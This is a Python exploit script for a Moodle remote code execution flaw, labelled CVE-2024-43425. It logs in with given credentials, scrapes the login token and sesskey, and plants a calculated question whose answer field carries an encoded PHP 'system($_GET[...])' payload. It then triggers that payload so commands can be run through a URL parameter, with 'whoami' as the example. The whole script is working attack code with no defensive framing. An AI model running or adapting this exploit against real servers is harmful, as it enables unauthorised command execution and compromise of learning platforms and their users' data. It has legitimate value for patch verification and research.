import argparse
import json
import requests
import re
import sys


requests.packages.urllib3.disable_warnings()


def get_login_token(session, login_url):
    print("[*] Step 1: GET /login/index.php to extract login token")
    try:
        response = session.get(login_url, verify=False)
    except Exception as e:
        print(f"[-] Error connecting to {login_url}: {e}")
        sys.exit(1)

    token_match = re.search(r'name="logintoken" value="([a-zA-Z0-9]+)">', response.text)
    if not token_match:
        print("[-] Failed to extract login token")
        sys.exit(1)

    token = token_match.group(1)
    print(f"[+] Found login token: {token}")
    return token


def perform_login(session, login_url, username, password, token):
    print("[*] Step 2: POST /login/index.php with credentials")
    login_payload = {
        "anchor": "",
        "logintoken": token,
        "username": username,
        "password": password,
    }
    try:
        response = session.post(
            login_url,
            data=login_payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            verify=False,
        )
    except Exception as e:
        print(f"[-] Login POST failed: {e}")
        sys.exit(1)

    if "MoodleSession" not in session.cookies.get_dict():
        print("[-] Login may have failed: session cookie not found.")
        sys.exit(1)

    print("[+] Logged in successfully.")


def get_sesskey(session, courses_url):
    print("[*] Step 3: GET /my/courses.php to extract sesskey")
    try:
        response = session.get(courses_url, verify=False)
    except Exception as e:
        print(f"[-] Error fetching courses page: {e}")
        sys.exit(1)

    sesskey_match = re.search(r'"sesskey":"([^"]+)"', response.text)
    if not sesskey_match:
        print("[-] Failed to extract sesskey")
        sys.exit(1)

    sesskey = sesskey_match.group(1)
    print(f"[+] Extracted sesskey: {sesskey}")
    return sesskey


def get_course_id(session, target, sesskey):
    print("[*] Step 4: POST /lib/ajax/service.php to get the available courses")
    ajax_url = (
        f"{target}/lib/ajax/service.php?sesskey={sesskey}"
        "&info=core_course_get_enrolled_courses_by_timeline_classification"
    )
    ajax_payload = {
        "index": 0,
        "methodname": "core_course_get_enrolled_courses_by_timeline_classification",
        "args": {
            "offset": 0,
            "limit": 0,
            "classification": "all",
            "sort": "fullname",
            "customfieldname": "",
            "customfieldvalue": "",
            "requiredfields": [
                "id",
                "fullname",
                "shortname",
                "showcoursecategory",
                "showshortname",
                "visible",
                "enddate",
            ],
        },
    }
    try:
        response = session.post(
            ajax_url,
            data=json.dumps([ajax_payload]),
            headers={"Content-Type": "application/json"},
            verify=False,
        )
    except Exception as e:
        print(f"[-] Error fetching courses: {e}")
        sys.exit(1)

    course_id_match = re.search(r'"id":(\d+)', response.text)
    if not course_id_match:
        print(response.text)
        print("[-] Failed to extract course ID")
        sys.exit(1)

    course_id = course_id_match.group(1)
    print(f"[+] Found course ID: {course_id}")
    return course_id


def create_question(session, target, course_id, sesskey):
    print("[*] Step 5: POST /question/bank/editquestion/question.php to create a new question")
    question_url = f"{target}/question/bank/editquestion/question.php"
    data_payload = (
        f"initialcategory=1&reload=1&shuffleanswers=1&answernumbering=abc&mform_isexpanded_id_answerhdr=1"
        f"&noanswers=1&nounits=1&numhints=2&synchronize=0&wizard=datasetdefinitions&id=0&inpopup=0&cmid=0"
        f"&courseid={course_id}&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D{course_id}%26deleteall%3D1&mdlscrollto=0"
        f"&appendqnumstring=&qtype=calculated&makecopy=0&sesskey={sesskey}&_qf__qtype_calculated_edit_form=1"
        f"&mform_isexpanded_id_generalheader=1&mform_isexpanded_id_unithandling=0&mform_isexpanded_id_unithdr=0"
        f"&mform_isexpanded_id_multitriesheader=0&mform_isexpanded_id_tagsheader=0&category=4%2C3"
        f"&name=5pk23hjpo32kffffff15h&questiontext%5Btext%5D=%3Cp%3Efwafwafw%3C%2Fp%3E"
        f"&questiontext%5Bformat%5D=1&questiontext%5Bitemid%5D=264479045&status=ready&defaultmark=1"
        f"&generalfeedback%5Btext%5D=&generalfeedback%5Bformat%5D=1&generalfeedback%5Bitemid%5D=827323963"
        f"&idnumber=&answer%5B0%5D=%281%29-%3E%7Bsystem%28%24_GET%5Bchr%2897%29%5D%29%7D"
        f"&fraction%5B0%5D=1.0&tolerance%5B0%5D=0.01&tolerancetype%5B0%5D=1"
        f"&correctanswerlength%5B0%5D=2&correctanswerformat%5B0%5D=1&feedback%5B0%5D%5Btext%5D="
        f"&feedback%5B0%5D%5Bformat%5D=1&feedback%5B0%5D%5Bitemid%5D=760998588&unitrole=3"
        f"&penalty=0.3333333&hint%5B0%5D%5Btext%5D=&hint%5B0%5D%5Bformat%5D=1"
        f"&hint%5B0%5D%5Bitemid%5D=452336056&hint%5B1%5D%5Btext%5D=&hint%5B1%5D%5Bformat%5D=1"
        f"&hint%5B1%5D%5Bitemid%5D=618111986&tags=_qf__force_multiselect_submission&submitbutton=Save+changes"
    )
    try:
        response = session.post(
            question_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data_payload,
            verify=False,
        )
    except Exception as e:
        print(f"[-] Error creating question: {e}")
        sys.exit(1)

    print("[+] Created question successfully.")
    return response.url


def extract_question_id(returned_url):
    
    question_id_match = re.search(r"&id=([0-9]+)&", returned_url)
    if not question_id_match:
        print("[-] Failed to extract question ID")
        sys.exit(1)
    question_id = question_id_match.group(1)
    print(f"[+] Found question ID: {question_id}")
    return question_id


def trigger_rce(session, target, question_id, course_id, sesskey):
    print("[*] Step 6: POST /question/bank/editquestion/question.php to trigger the RCE")
    question_url = f"{target}/question/bank/editquestion/question.php?wizardnow=datasetdefinitions"
    data_payload = (
        f"id={question_id}&inpopup=0&cmid=&courseid={course_id}"
        f"&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D{course_id}%26deleteall%3D1&mdlscrollto=0"
        f"&appendqnumstring=&category=4%2C3&wizard=datasetitems&sesskey={sesskey}"
        f"&_qf__question_dataset_dependent_definitions_form=1&dataset%5B0%5D=&synchronize=0"
        f"&submitbutton=Next+page"
    )
    try:
        response = session.post(
            question_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data_payload,
            verify=False,
        )
    except Exception as e:
        print(f"[-] Error triggering RCE: {e}")
        sys.exit(1)

    print("[+] RCE triggered successfully.")
    print(f"[*] The parameter to inject is 'a' (e.g. &a=whoami)")
    print(f"[*] Example: {response.url}&a=whoami")


def main():
    parser = argparse.ArgumentParser(
        description="Moodle RCE Exploit (CVE-2024-43425) adapted from a nuclei template."
    )
    parser.add_argument(
        "--url",
        required=True,
        help="Target URL (e.g. https://example.com). Do not include a trailing slash.",
    )
    parser.add_argument("--username", required=True, help="Moodle username")
    parser.add_argument("--password", required=True, help="Moodle password")
    args = parser.parse_args()

    target = args.url.rstrip("/")
    session = requests.Session()

    
    login_url = f"{target}/login/index.php"
    token = get_login_token(session, login_url)

    
    perform_login(session, login_url, args.username, args.password, token)

    
    courses_url = f"{target}/my/courses.php"
    sesskey = get_sesskey(session, courses_url)

    
    course_id = get_course_id(session, target, sesskey)

    
    returned_url = create_question(session, target, course_id, sesskey)
    print(returned_url)

    
    question_id = extract_question_id(returned_url)

    
    trigger_rce(session, target, question_id, course_id, sesskey)


if __name__ == "__main__":
    main()
